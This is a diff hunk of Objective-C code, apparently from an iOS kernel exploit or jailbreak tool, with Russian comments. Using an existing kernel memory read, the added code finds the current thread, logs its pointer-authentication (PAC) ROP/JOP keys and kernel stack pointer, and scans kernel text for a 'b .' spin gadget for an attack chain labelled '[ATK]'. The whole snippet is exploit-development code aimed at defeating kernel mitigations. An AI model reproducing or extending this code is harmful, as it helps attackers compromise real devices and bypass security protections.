@@ -2334,6 +2334,37 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                 }
             }
         }
+        // 2.0.96: наш поток — PAC keys (это они нужны для PACIBSP/RETAB)
+        {
+            uint64_t taskVA = 0;
+            uint64_t pr2 = early_kread64(selfProc + koffsetof(proc, proc_ro));
+            if (kpLooksLikeKernelPointer(pr2))
+                taskVA = kp_untag_ptr(early_kread64(kp_untag_ptr(pr2) + off_proc_ro_pr_task));
+            if (kpLooksLikeKernelPointer(taskVA)) {
+                uint64_t head = taskVA + off_task_threads_next;
+                uint64_t e = kp_untag_ptr(early_kread64(head));
+                if (kpLooksLikeKernelPointer(e)) {
+                    uint64_t th = e - off_thread_task_threads_next;
+                    if (kpLooksLikeKernelPointer(th)) {
+                        uint64_t rop = off_thread_machine_rop_pid ? kp_untag_ptr(early_kread64(th + off_thread_machine_rop_pid)) : 0;
+                        uint64_t jop = off_thread_machine_jop_pid ? kp_untag_ptr(early_kread64(th + off_thread_machine_jop_pid)) : 0;
+                        uint64_t kstack = kp_untag_ptr(early_kread64(th + 0x140)); // machine.kstackptr
+                        kpNote(r, [NSString stringWithFormat:@"  [BOOT] selfTh=%#llx rop=%#llx jop=%#llx kstack=%#llx",
+                                  (unsigned long long)th, (unsigned long long)rop, (unsigned long long)jop, (unsigned long long)kstack]);
+                    }
+                }
+            }
+        }
+        // 2.0.96: spin-gadget (b .) в kernel __TEXT — ищем 0x14000000
+        {
+            uint64_t kb = kconstant(base);
+            uint64_t found = 0;
+            for (uint64_t a = kb; a < kb + 0x200000 && !found; a += 4) {
+                uint32_t w = (uint32_t)early_kread64(a); // low 32
+                if (w == 0x14000000) { found = a; break; }
+            }
+            kpNote(r, [NSString stringWithFormat:@"  [BOOT] spin-gadget (b .) = %#llx", (unsigned long long)found]);
+        }
     }
 
     kpNote(r, @"  [ATK] step1: resolve proc");
